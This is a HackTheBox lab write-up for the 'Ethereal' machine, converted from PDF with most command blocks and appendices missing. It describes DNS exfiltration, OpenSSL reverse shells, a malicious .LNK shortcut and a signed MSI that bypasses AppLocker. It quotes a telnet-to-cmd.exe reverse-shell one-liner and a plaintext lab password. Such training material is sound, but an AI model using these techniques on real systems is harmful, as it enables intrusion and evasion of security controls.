# Ethereal

*Converted from: Ethereal.pdf*

---

# Ethereal
## **30 [th] February 2019 / Document No D19.100.10**

**Prepared By: egre55**

**Machine Author: MinatoTW & egre55**

**Difficulty: Insane**

**Classification: Official**


Page 1 / 30


​ ​ ​


## **SYNOPSIS**

Ethereal is an "​ insane​ " difficulty machine, which showcases how DNS can be used to exfiltrate ​

information from a system, and is applicable to many externally facing applications. It also

features a very restrictive environment, which is made more hospitable by the use of the

OpenSSL "LOLBIN". It highlights how malicious shortcut files can be used to move laterally and

vertically within a system or network. Finally, it shows how an attacker would be able use trusted

certificates to defeat a stringent application whitelisting configuration. Finally, it showcases

techniques for creating and signing Windows Installer (MSI) files.



​ ​ ​

## **Skills Required**


  - Basic knowledge of Internet protocols

  - Intermediate knowledge of Windows



​ ​ ​

## **Skills Learned**


  - DNS data exfiltration

  - OpenSSL egress check, reverse shell,

digest generation, and file transfer

techniques

  - Malicious shortcut testing and creation

  - Malicious MSI testing and creation

  - Enumeration and replication of

AppLocker Policy


Page 2 / 30


## **Enumeration** **Nmap**





Nmap output shows that (anonymous) FTP and an IIS Server listening on ports 80 and 8080 are

available. Port 80 reveals the landing page below, and various other pages, which seem


Page 3 / 30


## **Inspection of FTP files**

Multiple files and folders are present, and so wget is used to mirror the content locally.





Page 4 / 30


The files are examined and "FDISK.zip" is extracted. This seems to contain a Floppy Disk image.


The image is mounted and inspected, which reveals the "PasswordBox" command-line password

manager.





Page 5 / 30


## **PasswordBox**

This is copied to the current working directory, and a Linux version of PasswordBox is

downloaded and prerequisites installed.





Access is gained with a password of "password".



Page 6 / 30


## **Port 8080**

The user "alan" is referenced. The hostname "ethereal.htb" is added to "/etc/hosts". After trying to

log in to the page on port 8080, access is gained with the username "alan" and the "management

server" password.


alan:!C414m17y57r1k3s4g41n!


This reveals a "Test-Connection" page, which displays whether the ping was successful or not,

but doesn’t show command output. "tshark" is stood up and confirms that the ping request was

successful.





Page 7 / 30


​


## **DNS data exfiltration**

After trying various techniques, it seems some sort of restriction is preventing outbound

communication. However, DNS is usually allowed out. Indeed, the DNS request is successful.


​



​



​



It should now be possible to read environment variables from the target system. The parameter

"-querytype=A" is specified, to make the output more readable.


​



​



​



This is successful, and the expected OS is returned. A treasure trove of information can be

gleaned from Windows environment variables, see **Appendix A** ​ for reference.


For example, the PATH variable may reveal whether any interesting programs have been

installed. The data contained within this variable is too large to fit inside a single DNS query, and

so DOS substring syntax can be used to "walk" the PATH.



​



​



​



​


Page 8 / 30


## **Command Execution**

Using FOR loop one-liners, it should also be possible to achieve rudimentary command

execution.





This is successful, and after examining the Program Files folders, OpenSSL is discovered.





Page 9 / 30


​


## **Foothold** **Egress check**

The blog post below by Andreas Hontzia (@honze) shows how OpenSSL can be used to gain a

reverse shell from Linux.


[https://medium.com/@honze_net/openssl-reverse-shell-with-certificate-pinning-e0955c37b4a7](https://medium.com/@honze_net/openssl-reverse-shell-with-certificate-pinning-e0955c37b4a7)


Perhaps the classic telnet 10.10.10.10 80 | cmd.exe | telnet 10.10.10.10 443​

redirection technique can be applied to OpenSSL on Windows? This seems likely, but before a

reverse shell is attempted, it is necessary to check which ports allow outbound traffic.


OpenSSL can be used as a port scanner. tshark is configured to listen on the first 1000 ports, and

a simple FOR loop is executed.



​



​



​


It seems that ports 73 and 136 can be used.



​



​


Page 10 / 30


## **OpenSSL Reverse Shell**

tmux is configured in preparation for a split OpenSSL terminal.


First, the tmux window is split vertically into two panes "CTRL + B, then %"


To switch between panes, press "CTRL + B", and the relevant arrow key


To resize the resize pane, press and hold "CTRL + B", then press and hold the arrow key


The OpenSSL listeners are stood up, after creating a self-signed SSL certificate (pressing enter

through the prompts).





The command below is used to initiate a reverse shell.





A shell is received as "ETHEREAL\alan".



Page 11 / 30


## **Lateral Movement** **Malicious shortcut (.LNK)**

The note on Alan’s Desktop is inspected. It seems that he has created a Visual Studio shortcut on

the Public Desktop, which people have been instructed to use.


If this shortcut can be overwritten with a malicious version, potentially command execution as

another user can be achieved. Multiple methods exist of creating malicious shortcuts, but in this

case a Windows system will be used.


Page 12 / 30


## Replication of target environment

From a Windows Server OS (Server 2019 trial ISO link below), Visual Studio and OpenSSL are

installed.


[https://www.microsoft.com/evalcenter/evaluate-windows-server-2019?filetype=ISO](https://www.microsoft.com/evalcenter/evaluate-windows-server-2019?filetype=ISO)

[https://download.visualstudio.microsoft.com/download/pr/cd9a58d6-b7f7-40a5-b2ee-b5f6b1f49f](https://download.visualstudio.microsoft.com/download/pr/cd9a58d6-b7f7-40a5-b2ee-b5f6b1f49fbb/d70da2680dd650f2769a397a257caf01/vs_community.exe)

[bb/d70da2680dd650f2769a397a257caf01/vs_community.exe](https://download.visualstudio.microsoft.com/download/pr/cd9a58d6-b7f7-40a5-b2ee-b5f6b1f49fbb/d70da2680dd650f2769a397a257caf01/vs_community.exe)

[https://slproweb.com/download/Win64OpenSSL-1_1_0j.exe](https://slproweb.com/download/Win64OpenSSL-1_1_0j.exe)


OpenSSL is installed to "C:\Progra~2\OpenSSL-v1.1.0" (mirroring Ethereal).


The option is chosen to copy the OpenSSL binaries to the "/bin" directory.


Page 13 / 30


## Creating the shortcut

Next, a shortcut is created with the command below specified as the target. The "/MIN" switch

has been specified so that the "user" is not immediately alerted to the malicious nature of the

shortcut.





A Visual Studio icon can be chosen to replace the "cmd.exe" icon.


After double-clicking the shortcut, a test shell is received.



Page 14 / 30


## Shell as Jorge

The shortcut is updated to point to the tun0 IP address, and is copied to Ethereal using OpenSSL.





The following command transfers the file and creates "Visual Studio 2017_1.lnk". Sometimes the

copy process can lock the file, which prevents execution. So it is best to copy this file to the

destination name from another shell.





The OpenSSL listeners are readied to receive the shell, and the command below is executed to

rename the shortcut.





A shell is received as the unprivileged user "ETHEREAL\jorge", and enumeration continues.


Page 15 / 30


## **Privilege Escalation** **Malicious MSI**

The "net use" command doesn’t return any output. Possibly it has been blocked, but stderr is not

being returned. By appending "2>&1" to the end of the command, it is confirmed that "net.exe"

has been blocked.


The command "fsutil fsinfo drives" can be used instead. There is a D:, which is enumerated

further.


It seems a sysadmin "Rupal" will be testing MSIs in this folder, and apparently the certificate has

been added to the store already.


Page 16 / 30


Examination of the "Certs" folder reveals a Certification Authority (CA) certificate, and MyCA.pvk

which contains the private key.


It seems that the sysadmins sign MSI files as a security measure. AppLocker MSI policy is

examined, to confirm if signing of Windows Installer files is enforced.





This shows that the system will indeed only execute digitally signed Windows Installer files. The


Page 17 / 30


certificate and key are base64 encoded using OpenSSL.





MyCA.cer:





MyCA.pvk:





Page 18 / 30


OpenSSL is used on attacker controlled server to convert the base64 back the files.





Next, the WiX Toolset (used to create Windows installer packages) is downloaded and extracted.


[https://github.com/wixtoolset/wix3/releases/download/wix3111rtm/wix311-binaries.zip](https://github.com/wixtoolset/wix3/releases/download/wix3111rtm/wix311-binaries.zip)


Page 19 / 30


## Replication of target environment

With knowledge of the destination environment, it would be good to replicate it and confirm that

code execution is possible, which removes the need for trial and error and multiple file transfers.


In order to do this, a Microsoft Management Console (MMC) is be opened with administrative

privileges.


"Certificates", "Security Configuration and Analysis", "Security Templates", "Services" and "Group

Policy Object Editor" snap-ins are added.


First, the root CA certificate is added to the store by issuing the commands below, accepting the

prompt.





In the certificates MMC, verify that MyCA.cer is listed in the "Trusted Root Certification

Authorities" store.


Page 20 / 30


Next, the Application Identity service (which enables AppLocker enforcement) is started and set

to automatic. To do this, expand "Security Templates", right-click and select "New Template". Drill

down through to "System Services", double-click "Application Identity", select Define, set to

Automatic and click "OK". Right-click "Default" and click "Save".


Expand "Security Configuration and Analysis", right-click and select Open database.


Type Default and click "Open"

Select Default.inf and click "Open"

Right-click, select "Analyse Computer Now" and click "OK"

(The service should say "Investigate")

Right-click, select "Configure Computer Now" and click "OK"

Right-click, select "Analyse Computer Now" again and click "OK"

(This time it should say “OK”)


Expand "Local Computer Policy", and drill down through "Computer Configuration", "Security

Settings", "Application Control Policies" and expand "AppLocker".


Select "Windows Installer Rules", right-click and select "Create Default Rules". Delete all rules

except the "(Default Rule) All digitally signed Windows Installer files" Publisher rule.


Page 21 / 30


​



​



Right-click "AppLocker", and on the "Enforcement" tab, tick the "Windows Installer rules" box, and

click OK.


Restart the test server, and AppLocker policy mirroring that on Ethereal will now be in effect.


The WiX MSI template (see **Appendix B** ​ ) is copied to the binaries directory. The OpenSSL

command can be modified to spawn "calc.exe" or to point to a local system for testing purposes.


Page 22 / 30



​


## Creating the MSI

The following commands are used to create the unsigned MSI. A test executable (notepad.exe) is

copied to the system in order for the MSI to "install" it.





The unsigned MSI is executed, and as expected, this is prevented by AppLocker policy.


Page 23 / 30


## Signing the MSI

The following commands are used to sign the MSI using the certificate and key from Ethereal.

First, a code signing certificate is created (Visual Studio paths may differ). When prompted for the

private key password, select "None".





Next, the code signing certificate and private key are converted to PFX (Personal Information
Exchange).





The MSI is renamed to "exec-signed.msi" and the PFX is used to sign it.





Page 24 / 30


After running the signed MSI the test payload executes successfully. The MSI can now be

recreated with the OpenSSL reverse shell payload.


Page 25 / 30


## Shell as Rupal

OpenSSL is stood up, and the MSI is transferred to Ethereal.







OpenSSL is used to generate a SHA1 digest for source and destination files, to confirm that the

file transfer completed successfully.





The OpenSSL listeners are stood up again, and the MSI is moved to the "MSIs" folder.





After waiting 5 minutes (at most), a reverse shell running as "ETHEREAL\rupal" is received, and

the root flag can be captured.


Note:


Page 26 / 30


Rupal is in the "Administrators" group, but is a split-token admin, and so a UAC bypass would be

required in order to gain full administrative privileges.


Page 27 / 30


## **Appendix A: Windows Variables**





Page 28 / 30


Page 29 / 30


## **Appendix B: WiX MSI Template**

























Page 30 / 30


